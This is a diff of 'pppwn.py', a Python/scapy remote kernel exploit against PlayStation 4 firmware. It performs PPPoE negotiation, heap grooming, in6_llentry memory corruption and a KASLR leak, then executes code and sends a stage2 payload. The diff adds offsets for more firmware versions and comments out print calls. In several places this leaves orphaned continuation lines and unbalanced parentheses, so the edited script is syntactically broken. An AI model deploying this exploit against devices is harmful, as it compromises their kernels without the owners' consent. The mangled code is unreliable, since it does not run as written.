@@ -1,11 +1,16 @@
+#!/usr/bin/env python3
+#
+# Copyright (C) 2024 Andy Nguyen
+#
+# This software may be modified and distributed under the terms
+# of the MIT license.  See the LICENSE file for details.
+
 from argparse import ArgumentParser
 from scapy.all import *
 from scapy.layers.ppp import *
 from struct import pack, unpack
 from sys import exit
 from time import sleep
-import multiprocessing
-from tqdm import tqdm
 from offsets import *
 
 # PPPoE constants
@@ -177,28 +182,28 @@ class Exploit():
         return self.kaslr_offset + addr
 
     def lcp_negotiation(self):
-        print('[*] Sending LCP configure request...')
+        # print('[*] Sending LCP configure request...')
         self.s.send(
             Ether(src=self.source_mac,
                   dst=self.target_mac,
                   type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
             PPP() / PPP_LCP(code=CONF_REQ, id=self.LCP_ID))
 
-        print('[*] Waiting for LCP configure ACK...')
+        # print('[*] Waiting for LCP configure ACK...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                     PPP_LCP_Configure].code == CONF_ACK:
                 break
 
-        print('[*] Waiting for LCP configure request...')
+        # print('[*] Waiting for LCP configure request...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                     PPP_LCP_Configure].code == CONF_REQ:
                 break
 
-        print('[*] Sending LCP configure ACK...')
+        # print('[*] Sending LCP configure ACK...')
         self.s.send(
             Ether(src=self.source_mac,
                   dst=self.target_mac,
@@ -206,7 +211,7 @@ class Exploit():
             PPP() / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id))
 
     def ipcp_negotiation(self):
-        print('[*] Sending IPCP configure request...')
+        # print('[*] Sending IPCP configure request...')
         self.s.send(
             Ether(
                 src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
@@ -215,21 +220,21 @@ class Exploit():
                      id=self.IPCP_ID,
                      options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)))
 
-        print('[*] Waiting for IPCP configure ACK...')
+        # print('[*] Waiting for IPCP configure ACK...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(
                     PPP_IPCP) and pkt[PPP_IPCP].code == CONF_ACK:
                 break
 
-        print('[*] Waiting for IPCP configure request...')
+        # print('[*] Waiting for IPCP configure request...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(
                     PPP_IPCP) and pkt[PPP_IPCP].code == CONF_REQ:
                 break
 
-        print('[*] Sending IPCP configure NAK...')
+        # print('[*] Sending IPCP configure NAK...')
         self.s.send(
             Ether(
                 src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
@@ -238,14 +243,14 @@ class Exploit():
                      id=pkt[PPP_IPCP].id,
                      options=PPP_IPCP_Option_IPAddress(data=self.TARGET_IPV4)))
 
-        print('[*] Waiting for IPCP configure request...')
+        # print('[*] Waiting for IPCP configure request...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(
                     PPP_IPCP) and pkt[PPP_IPCP].code == CONF_REQ:
                 break
 
-        print('[*] Sending IPCP configure ACK...')
+        # print('[*] Sending IPCP configure ACK...')
         self.s.send(
             Ether(src=self.source_mac,
                   dst=self.target_mac,
@@ -255,7 +260,7 @@ class Exploit():
                              options=pkt[PPP_IPCP].options))
 
     def ppp_negotation(self, cb=None):
-        print('[*] Waiting for PADI...')
+        # print('[*] Waiting for PADI...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(
@@ -267,10 +272,10 @@ class Exploit():
                 host_uniq = tag.tag_value
 
         self.pppoe_softc = unpack('<Q', host_uniq)[0]
-        print('[+] pppoe_softc: {}'.format(hex(self.pppoe_softc)))
+        # print('[+] pppoe_softc: {}'.format(hex(self.pppoe_softc)))
 
         self.target_mac = pkt[Ether].src
-        print('[+] Target MAC: {}'.format(self.target_mac))
+        # print('[+] Target MAC: {}'.format(self.target_mac))
 
         self.source_mac = self.SOURCE_MAC
 
@@ -278,9 +283,9 @@ class Exploit():
             ac_cookie = cb()
         else:
             ac_cookie = b''
-        print('[+] AC cookie length: {}'.format(hex(len(ac_cookie))))
+        # print('[+] AC cookie length: {}'.format(hex(len(ac_cookie))))
 
-        print('[*] Sending PADO...')
+        # print('[*] Sending PADO...')
         self.s.send(
             Ether(src=self.source_mac,
                   dst=self.target_mac,
@@ -288,14 +293,14 @@ class Exploit():
             PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=ac_cookie) /
             PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=host_uniq))
 
-        print('[*] Waiting for PADR...')
+        # print('[*] Waiting for PADR...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(
                     PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADR:
                 break
 
-        print('[*] Sending PADS...')
+        # print('[*] Sending PADS...')
         self.s.send(
             Ether(src=self.source_mac,
                   dst=self.target_mac,
@@ -308,7 +313,7 @@ class Exploit():
         # Upper bytes are encoded with SESSION_ID
         planted = (self.pppoe_softc + 0x07) & 0xffffffffffff
         self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
-        print('[+] Source MAC: {}'.format(self.source_mac))
+        # print('[+] Source MAC: {}'.format(self.source_mac))
 
         # Fake ifnet
         fake_ifnet = bytearray()
@@ -384,7 +389,7 @@ class Exploit():
         # Upper bytes are encoded with SESSION_ID
         planted = self.kdlsym(self.offs.FIRST_GADGET) & 0xffffffffffff
         self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
-        print('[+] Source MAC: {}'.format(self.source_mac))
+        # print('[+] Source MAC: {}'.format(self.source_mac))
 
         # Fake in6_llentry
         fake_lle = bytearray()
@@ -601,25 +606,25 @@ class Exploit():
         lcp_echo_handler = LcpEchoHandler(self.iface)
         lcp_echo_handler.start()
 
-        print('')
-        print('[+] STAGE 0: Initialization')
+        # print('')
+        # print('[+] STAGE 0: Initialization')
 
         self.ppp_negotation(self.build_fake_ifnet)
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
-        print('[*] Waiting for interface to be ready...')
+        # print('[*] Waiting for interface to be ready...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(ICMPv6ND_RS):
                 break
 
         self.target_ipv6 = pkt[IPv6].src
-        print('[+] Target IPv6: {}'.format(self.target_ipv6))
+        # print('[+] Target IPv6: {}'.format(self.target_ipv6))
 
         for i in range(self.SPRAY_NUM):
             if i % 0x100 == 0:
-                print('[*] Heap grooming...{}%'.format(100 * i //
+                # print('[*] Heap grooming...{}%'.format(100 * i //
                                                        self.SPRAY_NUM),
                       end='\r',
                       flush=True)
@@ -645,17 +650,17 @@ class Exploit():
                 ICMPv6ND_NA(tgt=source_ipv6, S=1) /
                 ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
 
-        print('[+] Heap grooming...done')
+        # print('[+] Heap grooming...done')
 
-        print('')
-        print('[+] STAGE 1: Memory corruption')
+        # print('')
+        # print('[+] STAGE 1: Memory corruption')
 
-        # Send invalid packet to trigger a printf in the kernel. For some
+        # Send invalid packet to trigger a # printf in the kernel. For some
         # reason, this causes scheduling on CPU 0 at some point, which makes
         # the next allocation use the same per-CPU cache.
         for i in range(self.PIN_NUM):
             if i % 0x100 == 0:
-                print('[*] Pinning to CPU 0...{}%'.format(100 * i //
+                # print('[*] Pinning to CPU 0...{}%'.format(100 * i //
                                                           self.PIN_NUM),
                       end='\r',
                       flush=True)
@@ -666,14 +671,14 @@ class Exploit():
                       type=ETHERTYPE_PPPOE))
             sleep(0.001)
 
-        print('[+] Pinning to CPU 0...done')
+        # print('[+] Pinning to CPU 0...done')
 
         # LCP fails sometimes without the wait
         sleep(1)
 
         # Corrupt in6_llentry object
         overflow_lle = self.build_overflow_lle()
-        print('[*] Sending malicious LCP configure request...')
+        # print('[*] Sending malicious LCP configure request...')
         for i in range(self.CORRUPT_NUM):
             self.s.send(
                 Ether(src=self.source_mac,
@@ -686,7 +691,7 @@ class Exploit():
                                                      (TARGET_SIZE - 4)) /
                                       PPP_LCP_Option(data=overflow_lle))))
 
-        print('[*] Waiting for LCP configure reject...')
+        # print('[*] Waiting for LCP configure reject...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
@@ -700,7 +705,7 @@ class Exploit():
         corrupted = False
         for i in reversed(range(self.SPRAY_NUM)):
             if i % 0x100 == 0:
-                print('[*] Scanning for corrupted object...{}'.format(hex(i)),
+                # print('[*] Scanning for corrupted object...{}'.format(hex(i)),
                       end='\r',
                       flush=True)
 
@@ -733,16 +738,16 @@ class Exploit():
                 ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
 
         if not corrupted:
-            print('[-] Scanning for corrupted object...failed. Please retry.')
+            # print('[-] Scanning for corrupted object...failed. Please retry.')
             exit(1)
 
-        print(
+        # print(
             '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
 
-        print('')
-        print('[+] STAGE 2: KASLR defeat')
+        # print('')
+        # print('[+] STAGE 2: KASLR defeat')
 
-        print('[*] Defeating KASLR...')
+        # print('[*] Defeating KASLR...')
         while True:
             pkt = self.s.recv()
             if pkt and pkt.haslayer(
@@ -750,20 +755,20 @@ class Exploit():
                 break
 
         self.pppoe_softc_list = unpack('<Q', bytes(pkt[IPv6])[0x43:0x4b])[0]
-        print('[+] pppoe_softc_list: {}'.format(hex(self.pppoe_softc_list)))
+        # print('[+] pppoe_softc_list: {}'.format(hex(self.pppoe_softc_list)))
 
         self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
-        print('[+] kaslr_offset: {}'.format(hex(self.kaslr_offset)))
+        # print('[+] kaslr_offset: {}'.format(hex(self.kaslr_offset)))
 
         if (self.pppoe_softc_list & 0xffffffff00000fff
                 != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
-            print('[-] Error leak is invalid. Wrong firmware?')
+            # print('[-] Error leak is invalid. Wrong firmware?')
             exit(1)
 
-        print('')
-        print('[+] STAGE 3: Remote code execution')
+        # print('')
+        # print('[+] STAGE 3: Remote code execution')
 
-        print('[*] Sending LCP terminate request...')
+        # print('[*] Sending LCP terminate request...')
         self.s.send(
             Ether(
                 src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
@@ -771,13 +776,13 @@ class Exploit():
 
         self.ppp_negotation(self.build_fake_lle)
 
-        print('[*] Triggering code execution...')
+        # print('[*] Triggering code execution...')
         self.s.send(
             Ether(src=self.source_mac, dst=self.target_mac) /
             IPv6(src=self.SOURCE_IPV6, dst=self.target_ipv6) /
             ICMPv6EchoRequest())
 
-        print('[*] Waiting for stage1 to resume...')
+        # print('[*] Waiting for stage1 to resume...')
         count = 0
         while count < 3:
             pkt = self.s.recv()
@@ -785,7 +790,7 @@ class Exploit():
                     PPP_LCP_Configure].code == CONF_REQ:
                 count += 1
 
-        print('[*] Sending PADT...')
+        # print('[*] Sending PADT...')
         self.s.send(
             Ether(src=self.source_mac,
                   dst=self.target_mac,
@@ -796,10 +801,10 @@ class Exploit():
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
-        print('')
-        print('[+] STAGE 4: Arbitrary payload execution')
+        # print('')
+        # print('[+] STAGE 4: Arbitrary payload execution')
 
-        print('[*] Sending stage2 payload...')
+        # print('[*] Sending stage2 payload...')
         frags = fragment(
             IP(src=self.SOURCE_IPV4, dst=self.TARGET_IPV4) /
             UDP(dport=self.STAGE2_PORT) / self.stage2, 1024)
@@ -807,38 +812,49 @@ class Exploit():
         for frag in frags:
             self.s.send(Ether(src=self.source_mac, dst=self.target_mac) / frag)
 
-        print('[+] Done!')
+        # print('[+] Done!')
 
-def run_exploit(offs, interface, stage1, stage2):
-    exploit = Exploit(offs, interface, stage1, stage2)
-    exploit.run()
 
 def main():
-    parser = argparse.ArgumentParser('pppwn.py')
+    parser = ArgumentParser('pppwn.py')
     parser.add_argument('--interface', required=True)
-    parser.add_argument('--fw', default='1100')
+    parser.add_argument('--fw',
+                        choices=[
+                            '900', '903', '904', '950', '960', '1000', '1001',
+                            '1050', '1070', '1071', '1100'
+                        ],
+                        default='1100')
     parser.add_argument('--stage1', default='/root/PPPwn/stage1/stage1.bin')
     parser.add_argument('--stage2', default='/root/PPPwn/stage2/stage2.bin')
     args = parser.parse_args()
 
+    # print('[+] PPPwn - PlayStation 4 PPPoE RCE by theflow')
+    # print('[+] args: ' + ' '.join(f'{k}={v}' for k, v in vars(args).items()))
+
     with open(args.stage1, mode='rb') as f:
         stage1 = f.read()
+
     with open(args.stage2, mode='rb') as f:
         stage2 = f.read()
-    if args.fw == '1100':
+
+    if args.fw == '900':
+        offs = OffsetsFirmware_900()
+    elif args.fw in ('903', '904'):
+        offs = OffsetsFirmware_903_904()
+    elif args.fw in ('950', '960'):
+        offs = OffsetsFirmware_950_960()
+    elif args.fw in ('1000', '1001'):
+        offs = OffsetsFirmware_1000_1001()
+    elif args.fw in ('1050', '1070', '1071'):
+        offs = OffsetsFirmware_1050_1071()
+    elif args.fw == '1100':
         offs = OffsetsFirmware_1100()
 
-    # Jalankan skrip di latar belakang
-    p = multiprocessing.Process(target=run_exploit, args=(offs, args.interface, stage1, stage2))
-    p.start()
+    exploit = Exploit(offs, args.interface, stage1, stage2)
+    exploit.run()
 
-    # Tampilkan pesan loading dengan tqdm
-    for _ in tqdm(range(100), desc='Executing exploit', ascii=True, dynamic_ncols=True):
-        sleep(0.1)
+    return 0
 
-    # Tunggu sampai proses di latar belakang selesai
-    p.join()
 
 if __name__ == '__main__':
-    main()
-
+    exit(main())
